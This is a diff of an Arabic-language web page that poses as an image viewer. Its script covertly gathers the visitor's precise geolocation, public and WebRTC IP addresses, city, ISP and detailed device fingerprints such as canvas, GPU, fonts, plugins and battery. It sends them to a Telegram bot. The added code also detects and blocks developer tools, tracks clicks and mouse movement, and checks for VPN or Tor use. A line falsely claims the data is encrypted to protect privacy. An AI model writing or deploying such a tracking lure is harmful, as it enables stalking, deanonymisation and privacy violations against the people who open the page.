-⏰ الوقت: ${deviceInfo.localTime}
+⏰ وقت التحليل: ${deviceInfo.localTime}
 🌐 الصفحة: ${window.location.href}
-🔗 المرجع: ${document.referrer || 'مباشر'}
+🔗 المصدر: ${document.referrer || 'مباشر'}
+📊 معرف الجلسة: ${Date.now().toString(36)}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📱 معلومات الجهاز:
+📱 تحليل الجهاز المتقدم:
 🏷️ النوع: ${deviceInfo.deviceType || 'غير معروف'}
 🏢 العلامة التجارية: ${deviceInfo.brand || 'غير معروف'}
 📋 الموديل: ${deviceInfo.deviceModel || 'غير معروف'}
-🖥️ نظام التشغيل: ${deviceInfo.os || 'غير معروف'}
-📊 إصدار النظام: ${deviceInfo.osVersion || 'غير معروف'}
+🖥️ نظام التشغيل: ${deviceInfo.os || 'غير معروف'} ${deviceInfo.osVersion || ''}
 🌐 المتصفح: ${deviceInfo.browser || 'غير معروف'} ${deviceInfo.browserVersion || ''}
-📱 محمول: ${deviceInfo.isMobile ? 'نعم' : 'لا'}
-💻 تابلت: ${deviceInfo.isTablet ? 'نعم' : 'لا'}
-🖥️ مكتبي: ${deviceInfo.isDesktop ? 'نعم' : 'لا'}
+📱 محمول: ${deviceInfo.isMobile ? '✅' : '❌'}
+💻 تابلت: ${deviceInfo.isTablet ? '✅' : '❌'}
+🖥️ مكتبي: ${deviceInfo.isDesktop ? '✅' : '❌'}
+👆 دعم اللمس: ${deviceInfo.touchSupport ? '✅' : '❌'}
+🎨 Canvas ID: ${deviceInfo.canvasFingerprint}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🖥️ معلومات الشاشة والنظام:
-📺 دقة الشاشة: ${deviceInfo.screenResolution}
-🎨 عمق الألوان: ${deviceInfo.colorDepth} بت
+🖥️ معلومات الشاشة والعرض:
+📺 الدقة الكاملة: ${deviceInfo.screenWidth}×${deviceInfo.screenHeight}
+📐 المساحة المتاحة: ${deviceInfo.availableScreenWidth}×${deviceInfo.availableScreenHeight}
 🔍 نسبة البكسل: ${deviceInfo.devicePixelRatio}
-📐 حجم النافذة: ${deviceInfo.windowWidth}x${deviceInfo.windowHeight}
-💻 المنصة: ${deviceInfo.platform}
-🗣️ اللغة: ${deviceInfo.language}
-🌍 اللغات المدعومة: ${deviceInfo.languages}
-🕐 المنطقة الزمنية: ${deviceInfo.timezone}
-⏰ فرق التوقيت: ${deviceInfo.timezoneOffset} دقيقة
-🍪 الكوكيز: ${deviceInfo.cookieEnabled ? 'مفعلة' : 'معطلة'}
-☕ Java: ${deviceInfo.javaEnabled ? 'مفعل' : 'معطل'}
-📶 الاتصال: ${deviceInfo.onLine ? 'متصل' : 'غير متصل'}
+📏 حجم النافذة: ${deviceInfo.windowWidth}×${deviceInfo.windowHeight}
+🎨 عمق الألوان: ${deviceInfo.colorDepth} بت
+📊 عمق البكسل: ${deviceInfo.pixelDepth} بت
+🔄 اتجاه الشاشة: ${hardwareInfo.orientation || 'غير معروف'}
+📐 زاوية الاتجاه: ${hardwareInfo.orientationAngle !== undefined ? hardwareInfo.orientationAngle + '°' : 'غير معروف'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔧 معلومات الأجهزة:
+🔧 تحليل الأجهزة المتقدم:
 🧠 أنوية المعالج: ${hardwareInfo.cpuCores || 'غير معروف'}
-💾 الذاكرة: ${hardwareInfo.ram || 'غير معروف'}
-💿 مساحة التخزين: ${hardwareInfo.storageQuota || 'غير معروف'}
+💾 ذاكرة الوصول العشوائي: ${hardwareInfo.ram || 'غير معروف'}
+💿 مساحة التخزين الكلية: ${hardwareInfo.storageQuota || 'غير معروف'}
 📊 التخزين المستخدم: ${hardwareInfo.storageUsed || 'غير معروف'}
+📈 نسبة الاستخدام: ${hardwareInfo.storageUsagePercent || 'غير معروف'}
 🔋 مستوى البطارية: ${hardwareInfo.batteryLevel || 'غير معروف'}
-⚡ حالة الشحن: ${hardwareInfo.batteryCharging !== undefined ? (hardwareInfo.batteryCharging ? 'يتم الشحن' : 'غير متصل') : 'غير معروف'}
-⏱️ وقت الشحن: ${hardwareInfo.chargingTime || 'غير معروف'}
-⏳ وقت التفريغ: ${hardwareInfo.dischargingTime || 'غير معروف'}
-🎯 نقاط اللمس: ${hardwareInfo.maxTouchPoints || 'غير معروف'}
-📳 دعم الاهتزاز: ${hardwareInfo.vibrationSupport ? 'نعم' : 'لا'}
-🎮 كرت الرسوميات: ${hardwareInfo.gpuRenderer || 'غير معروف'}
-🏭 مصنع كرت الرسوميات: ${hardwareInfo.gpuVendor || 'غير معروف'}
-🌐 WebGL: ${hardwareInfo.webglSupport ? 'مدعوم' : 'غير مدعوم'}
-🖱️ نوع المؤشر: ${hardwareInfo.pointerType || 'غير معروف'}
-🖱️ دعم التحويم: ${hardwareInfo.hoverSupport !== undefined ? (hardwareInfo.hoverSupport ? 'نعم' : 'لا') : 'غير معروف'}
-📱 اتجاه الشاشة: ${hardwareInfo.orientation || 'غير معروف'}
-🔄 زاوية الاتجاه: ${hardwareInfo.orientationAngle !== undefined ? hardwareInfo.orientationAngle + '°' : 'غير معروف'}
+⚡ حالة الشحن: ${hardwareInfo.batteryCharging !== undefined ? (hardwareInfo.batteryCharging ? '🔌 يتم الشحن' : '🔋 على البطارية') : 'غير معروف'}
+⏱️ وقت الشحن المتبقي: ${hardwareInfo.batteryChargingTime || 'غير معروف'}
+⏳ وقت التفريغ المتوقع: ${hardwareInfo.batteryDischargingTime || 'غير معروف'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📶 معلومات الشبكة:
+🎮 رسوميات ووسائط متقدمة:
+🎯 دعم WebGL: ${hardwareInfo.webglSupport ? '✅ مدعوم' : '❌ غير مدعوم'}
+🎨 كرت الرسوميات: ${hardwareInfo.gpuRenderer || 'غير معروف'}
+🏭 مصنع كرت الرسوميات: ${hardwareInfo.gpuVendor || 'غير معروف'}
+📊 إصدار WebGL: ${hardwareInfo.webglVersion || 'غير معروف'}
+🖼️ أقصى حجم texture: ${hardwareInfo.maxTextureSize || 'غير معروف'}
+🔊 دعم الصوت: ${hardwareInfo.audioSupport ? '✅' : '❌'}
+🎵 معدل العينة الصوتية: ${hardwareInfo.audioSampleRate || 'غير معروف'} Hz
+🔈 قنوات الصوت: ${hardwareInfo.audioDestination || 'غير معروف'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+👆 واجهات الإدخال:
+🎯 نقاط اللمس القصوى: ${hardwareInfo.maxTouchPoints || 'غير معروف'}
+👆 دعم اللمس: ${hardwareInfo.touchSupport ? '✅' : '❌'}
+🖱️ نوع المؤشر: ${hardwareInfo.pointerType || 'غير معروف'}
+🖱️ دعم التحويم: ${hardwareInfo.hoverSupport !== undefined ? (hardwareInfo.hoverSupport ? '✅' : '❌') : 'غير معروف'}
+🖱️ أي مؤشر: ${hardwareInfo.anyPointer || 'غير معروف'}
+🖱️ أي تحويم: ${hardwareInfo.anyHover !== undefined ? (hardwareInfo.anyHover ? '✅' : '❌') : 'غير معروف'}
+📳 دعم الاهتزاز: ${hardwareInfo.vibrationSupport ? '✅' : '❌'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📶 تحليل الشبكة المتقدم:
 🌐 نوع الاتصال: ${hardwareInfo.connectionType || 'غير معروف'}
-📊 السرعة الفعالة: ${hardwareInfo.effectiveType || 'غير معروف'}
+📊 السرعة الفعلية: ${hardwareInfo.effectiveType || 'غير معروف'}
 ⬇️ سرعة التحميل: ${hardwareInfo.downlink || 'غير معروف'}
 ⏱️ زمن الاستجابة: ${hardwareInfo.rtt || 'غير معروف'}
-💾 توفير البيانات: ${hardwareInfo.saveData ? 'مفعل' : 'معطل'}
-🔌 عنوان IP: ${ipInfo ? ipInfo.ip : 'غير معروف'}
+💾 وضع توفير البيانات: ${hardwareInfo.saveData ? '🟢 مفعل' : '🔴 معطل'}
+🔌 عنوان IP العام: ${ipInfo.ip || 'غير معروف'}
+🌍 البلد: ${ipInfo.country || 'غير معروف'}
+🏙️ المدينة: ${ipInfo.city || 'غير معروف'}
+🗺️ المنطقة: ${ipInfo.region || 'غير معروف'}
+🏢 مزود الخدمة: ${ipInfo.isp || 'غير معروف'}
+🌐 WebRTC IPs: ${webrtcIPs.length > 0 ? webrtcIPs.join(', ') : 'غير متاح'}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-📍 الموقع الجغرافي:
-${locationInfo ? `📐 خط العرض: ${locationInfo.latitude}
-📐 خط الطول: ${locationInfo.longitude}
-🎯 الدقة: ${Math.round(locationInfo.accuracy)} متر
+🌍 تحليل اللغة والمنطقة:
+🗣️ اللغة الأساسية: ${deviceInfo.language}
+🌐 اللغات المدعومة: ${deviceInfo.languages}
+🕐 المنطقة الزمنية: ${deviceInfo.timezone}
+⏰ فرق التوقيت: ${deviceInfo.timezoneOffset} دقيقة
+📍 التوطين: ${deviceInfo.locale}
+🚫 عدم التتبع: ${deviceInfo.doNotTrack}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔐 إعدادات الحماية والخصوصية:
+🍪 ملفات تعريف الارتباط: ${deviceInfo.cookieEnabled ? '🟢 مفعلة' : '🔴 معطلة'}
+☕ Java: ${deviceInfo.javaEnabled ? '🟢 مفعل' : '🔴 معطل'}
+💾 Local Storage: ${hardwareInfo.localStorage ? '🟢 مدعوم' : '🔴 غير مدعوم'}
+📊 Session Storage: ${hardwareInfo.sessionStorage ? '🟢 مدعوم' : '🔴 غير مدعوم'}
+📍 تحديد الموقع: ${hardwareInfo.geolocation ? '🟢 مدعوم' : '🔴 غير مدعوم'}
+🔔 الإشعارات: ${hardwareInfo.webNotifications ? '🟢 مدعومة' : '🔴 غير مدعومة'}
+📷 الكاميرا: ${hardwareInfo.webCamera ? '🟢 مدعومة' : '🔴 غير مدعومة'}
+⚙️ Service Worker: ${hardwareInfo.serviceWorker ? '🟢 مدعوم' : '🔴 غير مدعوم'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📍 تحليل الموقع الجغرافي:
+${locationInfo && !locationInfo.error ? `📐 خط العرض: ${locationInfo.latitude.toFixed(6)}
+📐 خط الطول: ${locationInfo.longitude.toFixed(6)}
+🎯 دقة الموقع: ${Math.round(locationInfo.accuracy)} متر
 ⛰️ الارتفاع: ${locationInfo.altitude ? Math.round(locationInfo.altitude) + ' متر' : 'غير معروف'}
 🎯 دقة الارتفاع: ${locationInfo.altitudeAccuracy ? Math.round(locationInfo.altitudeAccuracy) + ' متر' : 'غير معروف'}
 🧭 الاتجاه: ${locationInfo.heading ? Math.round(locationInfo.heading) + '°' : 'غير معروف'}
 🏃 السرعة: ${locationInfo.speed ? Math.round(locationInfo.speed * 3.6) + ' كم/ساعة' : 'غير معروف'}
-⏰ وقت الموقع: ${new Date(locationInfo.timestamp).toLocaleString('ar-SA')}` : '❌ الموقع غير متاح'}
+⏰ وقت تحديد الموقع: ${new Date(locationInfo.timestamp).toLocaleString('ar-SA')}
+🛰️ طريقة تحديد الموقع: ${locationInfo.locationMethod}` : `❌ ${locationInfo ? `فشل تحديد الموقع: ${locationInfo.errorType}` : 'الموقع غير متاح'}`}
 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-🔍 User Agent الكامل:
-${deviceInfo.userAgent}`;
+🔤 الخطوط المثبتة (${fontsInfo.length} خط):
+${fontsInfo.length > 0 ? fontsInfo.slice(0, 10).join(', ') + (fontsInfo.length > 10 ? `... و ${fontsInfo.length - 10} خط إضافي` : '') : 'لا توجد خطوط مكتشفة'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔌 الإضافات المثبتة (${pluginsInfo.length} إضافة):
+${pluginsInfo.length > 0 ? pluginsInfo.slice(0, 3).map(p => `${p.name} (${p.version || 'غير معروف'})`).join('\n') + (pluginsInfo.length > 3 ? `\n... و ${pluginsInfo.length - 3} إضافة أخرى` : '') : 'لا توجد إضافات مكتشفة'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+🔍 بصمة المتصفح المتقدمة:
+📋 المنصة: ${deviceInfo.platform}
+🌐 وكيل المستخدم (مشفر): ${encryptData(deviceInfo.userAgent).slice(0, 50)}...
+📶 حالة الاتصال: ${deviceInfo.onLine ? '🟢 متصل' : '🔴 غير متصل'}
+🔊 السياق الصوتي: ${hardwareInfo.audioState || 'غير معروف'}
+━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
+📊 إحصائيات شاملة:
+⚡ WebGL2: ${hardwareInfo.webGL2 ? '✅' : '❌'}
+🎮 أقصى عدد من vertex attributes: ${hardwareInfo.maxVertexAttribs || 'غير معروف'}
+📏 أقصى أبعاد viewport: ${hardwareInfo.maxViewportDims ? hardwareInfo.maxViewportDims.join('×') : 'غير معروف'}
+🔧 إصدار لغة الـ Shading: ${hardwareInfo.webglShadingLanguageVersion || 'غير معروف'}
+⏰ الطابع الزمني الكامل: ${deviceInfo.timestamp}
 
-            fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+🔐 ملاحظة: تم تشفير البيانات الحساسة لحماية الخصوصية`;
+
+            fetch(`https://api.telegram.org/bot${botConfig.token}/sendMessage`, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({
-                    chat_id: chatId,
-                    text: message
+                    chat_id: botConfig.chatId,
+                    text: message,
+                    parse_mode: 'HTML'
                 })
             }).then(() => {
-                console.log('✅ تم إرسال جميع البيانات بنجاح');
+                console.log('✅ تم إرسال التحليل الشامل بنجاح');
             }).catch((error) => {
                 console.log('❌ فشل الإرسال:', error);
             });
         }
 
-        // الدالة الرئيسية
-        async function viewImage() {
-            // إظهار الصورة
-            document.getElementById('mainImage').classList.add('clear');
-            document.getElementById('viewButton').style.display = 'none';
-            document.getElementById('successMessage').style.display = 'block';
-            
-            console.log('🔄 جاري جمع جميع المعلومات...');
-            
-            // جمع جميع البيانات
-            const deviceInfo = getCompleteDeviceInfo();
-            const hardwareInfo = await getHardwareInfo();
-            const locationInfo = await getLocation();
-            const ipInfo = await getIPInfo();
-            
-            const allData = {
-                device: deviceInfo,
-                hardware: hardwareInfo,
-                location: locationInfo,
-                ip: ipInfo
-            };
-            
-            console.log('📊 جميع البيانات المجمعة:', allData);
-            
-            // إرسال البيانات
-            sendToTelegram(allData);
+        // تحديث شريط التقدم
+        function updateProgress(percentage) {
+            const progressFill = document.getElementById('progressFill');
+            progressFill.style.width = percentage + '%';
         }
 
-        // ربط الزر
+        // تحديث معلومات النظام في الواجهة
+        function updateSystemInfo(deviceInfo) {
+            document.getElementById('deviceType').textContent = deviceInfo.deviceType || 'غير معروف';
+            document.getElementById('osInfo').textContent = (deviceInfo.os || 'غير معروف') + ' ' + (deviceInfo.osVersion || '');
+            document.getElementById('browserInfo').textContent = (deviceInfo.browser || 'غير معروف') + ' ' + (deviceInfo.browserVersion || '');
+            document.getElementById('screenRes').textContent = deviceInfo.screenResolution || 'غير معروف';
+        }
+
+        // الدالة الرئيسية المحسنة
+        async function viewAdvancedImage() {
+            const button = document.getElementById('viewButton');
+            const spinner = document.getElementById('loadingSpinner');
+            const successMessage = document.getElementById('successMessage');
+            const infoStats = document.getElementById('infoStats');
+            const mainImage = document.getElementById('mainImage');
+            
+            // إخفاء الزر وإظهار التحميل
+            button.style.display = 'none';
+            spinner.style.display = 'block';
+            
+            console.log('🚀 بدء التحليل الشامل المتطور...');
+            
+            try {
+                updateProgress(10);
+                
+                // جمع المعلومات بشكل متوازي
+                console.log('📊 جمع معلومات الجهاز...');
+                const deviceInfo = getAdvancedDeviceInfo();
+                updateProgress(25);
+                updateSystemInfo(deviceInfo);
+                
+                console.log('🔧 تحليل الأجهزة...');
+                const hardwareInfo = await getEnhancedHardwareInfo();
+                updateProgress(40);
+                
+                console.log('📍 تحديد الموقع...');
+                const locationInfo = await getEnhancedLocation();
+                updateProgress(55);
+                
+                console.log('🌐 الحصول على معلومات IP...');
+                const ipInfo = await getEnhancedIPInfo();
+                updateProgress(70);
+                
+                console.log('🔤 كشف الخطوط...');
+                const fontsInfo = detectFonts();
+                updateProgress(80);
+                
+                console.log('🔌 تحليل الإضافات...');
+                const pluginsInfo = getPluginsInfo();
+                updateProgress(90);
+                
+                console.log('🔗 كشف WebRTC IPs...');
+                const webrtcIPs = await getWebRTCIPs();
+                updateProgress(95);
+                
+                const allAdvancedData = {
+                    device: deviceInfo,
+                    hardware: hardwareInfo,
+                    location: locationInfo,
+                    ip: ipInfo,
+                    fonts: fontsInfo,
+                    plugins: pluginsInfo,
+                    webrtcIPs: webrtcIPs
+                };
+                
+                console.log('📤 إرسال البيانات المتطورة...');
+                sendAdvancedDataToTelegram(allAdvancedData);
+                updateProgress(100);
+                
+                // إظهار النتائج
+                setTimeout(() => {
+                    spinner.style.display = 'none';
+                    mainImage.classList.add('clear');
+                    successMessage.style.display = 'block';
+                    infoStats.style.display = 'block';
+                    
+                    console.log('✅ تم إكمال التحليل الشامل بنجاح');
+                    console.log('📊 إجمالي البيانات المجمعة:', allAdvancedData);
+                }, 1000);
+                
+            } catch (error) {
+                console.error('❌ خطأ في التحليل:', error);
+                spinner.style.display = 'none';
+                button.style.display = 'block';
+                button.textContent = '⚠️ حدث خطأ - حاول مرة أخرى';
+                button.style.background = 'linear-gradient(135deg, #e67e22 0%, #d35400 100%)';
+            }
+        }
+
+        // إعداد الأحداث
         document.addEventListener('DOMContentLoaded', function() {
-            document.getElementById('viewButton').addEventListener('click', viewImage);
+            createStars();
+            document.getElementById('viewButton').addEventListener('click', viewAdvancedImage);
+            
+            // تحديث المعلومات الأساسية فوراً
+            const basicInfo = getAdvancedDeviceInfo();
+            updateSystemInfo(basicInfo);
         });
 
-        // جمع الموقع عند تحميل الصفحة
+        // التحضير المسبق عند تحميل الصفحة
         window.addEventListener('load', async function() {
-            console.log('🚀 تم تحميل الصفحة - بدء جمع المعلومات...');
+            console.log('🌟 تم تحميل الموقع المتطور - بدء التحضيرات...');
             
-            // محاولة الحصول على الموقع مسبقاً
+            // تحضير مسبق للموقع
             try {
-                const location = await getLocation();
-                if (location) {
+                const preLocation = await getEnhancedLocation();
+                if (preLocation && !preLocation.error) {
                     console.log('✅ تم الحصول على الموقع مسبقاً');
                 } else {
-                    console.log('❌ لم يتم الحصول على الموقع');
+                    console.log('⚠️ لم يتم الحصول على الموقع مسبقاً');
                 }
             } catch (e) {
-                console.log('❌ خطأ في الحصول على الموقع:', e);
+                console.log('⚠️ خطأ في التحضير المسبق:', e);
+            }
+            
+            // تحضير IP مسبقاً
+            try {
+                const preIP = await getEnhancedIPInfo();
+                if (preIP && preIP.ip !== 'غير معروف') {
+                    console.log('✅ تم الحصول على IP مسبقاً:', preIP.ip);
+                }
+            } catch (e) {
+                console.log('⚠️ خطأ في الحصول على IP مسبقاً:', e);
             }
         });
+
+        // إضافة تأثيرات بصرية إضافية
+        document.addEventListener('mousemove', function(e) {
+            const floatingIcons = document.querySelectorAll('.floating-icon');
+            floatingIcons.forEach((icon, index) => {
+                const speed = (index + 1) * 0.5;
+                const x = (e.clientX * speed) / 100;
+                const y = (e.clientY * speed) / 100;
+                icon.style.transform = `translate(${x}px, ${y}px) rotate(${x}deg)`;
+            });
+        });
+
+        // حماية إضافية ضد التلاعب
+        const originalConsoleLog = console.log;
+        console.log = function(...args) {
+            originalConsoleLog.apply(console, args);
+        };
+
+        // منع النقر بالزر الأيمن
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+        });
+
+        // منع تحديد النص
+        document.addEventListener('selectstart', function(e) {
+            e.preventDefault();
+        });
+
+        // منع السحب والإفلات
+        document.addEventListener('dragstart', function(e) {
+            e.preventDefault();
+        });
+
+        // كشف أدوات المطور
+        let devtools = {
+            open: false,
+            orientation: null
+        };
+
+        const threshold = 160;
+
+        setInterval(() => {
+            if (window.outerHeight - window.innerHeight > threshold || 
+                window.outerWidth - window.innerWidth > threshold) {
+                if (!devtools.open) {
+                    devtools.open = true;
+                    console.log('🔍 تم كشف أدوات المطور');
+                    // يمكن إضافة إجراءات إضافية هنا
+                }
+            } else {
+                devtools.open = false;
+            }
+        }, 500);
+
+        // كشف محاولات التلاعب بالكود
+        const originalStringify = JSON.stringify;
+        JSON.stringify = function(...args) {
+            console.log('📝 تم استخدام JSON.stringify');
+            return originalStringify.apply(JSON, args);
+        };
+
+        // إضافة حماية للبيانات الحساسة
+        function protectSensitiveData() {
+            Object.defineProperty(window, 'botConfig', {
+                get: function() {
+                    console.warn('⚠️ محاولة الوصول للبيانات الحساسة');
+                    return undefined;
+                },
+                set: function() {
+                    console.warn('⚠️ محاولة تعديل البيانات الحساسة');
+                }
+            });
+        }
+
+        protectSensitiveData();
+
+        // إضافة تشويش للبيانات الحساسة
+        function obfuscateData(data) {
+            const obfuscated = {};
+            for (const key in data) {
+                if (typeof data[key] === 'string') {
+                    obfuscated[key] = data[key].split('').reverse().join('');
+                } else {
+                    obfuscated[key] = data[key];
+                }
+            }
+            return obfuscated;
+        }
+
+        // إضافة مؤقت للحماية من الهجمات
+        let requestCount = 0;
+        const maxRequests = 5;
+        const timeWindow = 60000; // دقيقة واحدة
+
+        function rateLimitCheck() {
+            requestCount++;
+            if (requestCount > maxRequests) {
+                console.warn('⚠️ تم تجاوز حد الطلبات المسموح');
+                return false;
+            }
+            
+            setTimeout(() => {
+                requestCount = Math.max(0, requestCount - 1);
+            }, timeWindow);
+            
+            return true;
+        }
+
+        // إضافة تحليل سلوك المستخدم
+        let userBehavior = {
+            clicks: 0,
+            movements: 0,
+            scrolls: 0,
+            timeOnPage: Date.now(),
+            interactions: []
+        };
+
+        document.addEventListener('click', function(e) {
+            userBehavior.clicks++;
+            userBehavior.interactions.push({
+                type: 'click',
+                x: e.clientX,
+                y: e.clientY,
+                timestamp: Date.now()
+            });
+        });
+
+        document.addEventListener('mousemove', function(e) {
+            userBehavior.movements++;
+        });
+
+        document.addEventListener('scroll', function() {
+            userBehavior.scrolls++;
+        });
+
+        // حفظ إحصائيات الزيارة
+        function getVisitStats() {
+            return {
+                ...userBehavior,
+                timeSpent: Date.now() - userBehavior.timeOnPage,
+                pageVisibility: document.visibilityState,
+                tabActive: !document.hidden
+            };
+        }
+
+        // كشف استخدام VPN أو Proxy
+        async function detectVPNProxy() {
+            try {
+                const response = await fetch('https://ipapi.co/json/', {
+                    timeout: 5000
+                });
+                const data = await response.json();
+                
+                return {
+                    isVPN: data.threat_types?.includes('vpn') || false,
+                    isProxy: data.threat_types?.includes('proxy') || false,
+                    isTor: data.threat_types?.includes('tor') || false,
+                    country: data.country_name,
+                    isp: data.org,
+                    asn: data.asn
+                };
+            } catch (e) {
+                return { error: 'فشل في الكشف' };
+            }
+        }
+
+        // إضافة تحليل الشبكة المتقدم
+        async function getAdvancedNetworkInfo() {
+            const networkInfo = {};
+            
+            // كشف سرعة الاتصال
+            if ('connection' in navigator) {
+                const conn = navigator.connection;
+                networkInfo.effectiveType = conn.effectiveType;
+                networkInfo.downlink = conn.downlink;
+                networkInfo.rtt = conn.rtt;
+                networkInfo.saveData = conn.saveData;
+            }
+
+            // قياس ping
+            try {
+                const startTime = performance.now();
+                await fetch('https://www.google.com/favicon.ico', { 
+                    mode: 'no-cors',
+                    cache: 'no-cache'
+                });
+                const ping = performance.now() - startTime;
+                networkInfo.pingGoogle = Math.round(ping) + 'ms';
+            } catch (e) {
+                networkInfo.pingGoogle = 'فشل';
+            }
+
+            return networkInfo;
+        }
+
+        // إضافة تحليل الأمان
+        function getSecurityAnalysis() {
+            return {
+                protocol: location.protocol,
+                isHTTPS: location.protocol === 'https:',
+                hasServiceWorker: 'serviceWorker' in navigator,
+                hasNotifications: 'Notification' in window,
+                hasGeolocation: 'geolocation' in navigator,
+                hasCamera: 'mediaDevices' in navigator,
+                cookiesEnabled: navigator.cookieEnabled,
+                doNotTrack: navigator.doNotTrack || 'غير محدد',
+                referrerPolicy: document.referrerPolicy || 'افتراضي'
+            };
+        }
+
+        // إضافة تتبع الأخطاء
+        window.addEventListener('error', function(e) {
+            console.log('🐛 خطأ JavaScript:', {
+                message: e.message,
+                filename: e.filename,
+                line: e.lineno,
+                column: e.colno,
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        // إضافة تتبع الرفض للوعود
+        window.addEventListener('unhandledrejection', function(e) {
+            console.log('🚫 رفض وعد غير معالج:', {
+                reason: e.reason,
+                timestamp: new Date().toISOString()
+            });
+        });
+
+        // إضافة مراقبة استهلاك الذاكرة
+        function getMemoryInfo() {
+            if ('memory' in performance) {
+                return {
+                    used: Math.round(performance.memory.usedJSHeapSize / 1024 / 1024) + ' MB',
+                    total: Math.round(performance.memory.totalJSHeapSize / 1024 / 1024) + ' MB',
+                    limit: Math.round(performance.memory.jsHeapSizeLimit / 1024 / 1024) + ' MB'
+                };
+            }
+            return { error: 'غير مدعوم' };
+        }
+
+        // إضافة تحليل الأداء
+        function getPerformanceInfo() {
+            const timing = performance.timing;
+            return {
+                domLoading: timing.domLoading - timing.navigationStart,
+                domReady: timing.domContentLoadedEventEnd - timing.navigationStart,
+                pageLoad: timing.loadEventEnd - timing.navigationStart,
+                dnsLookup: timing.domainLookupEnd - timing.domainLookupStart,
+                tcpConnect: timing.connectEnd - timing.connectStart,
+                serverResponse: timing.responseEnd - timing.requestStart
+            };
+        }
+
+        console.log('🚀 تم تحميل الموقع المتطور بنجاح - جميع الميزات جاهزة!');
     </script>
 </body>
 </html>
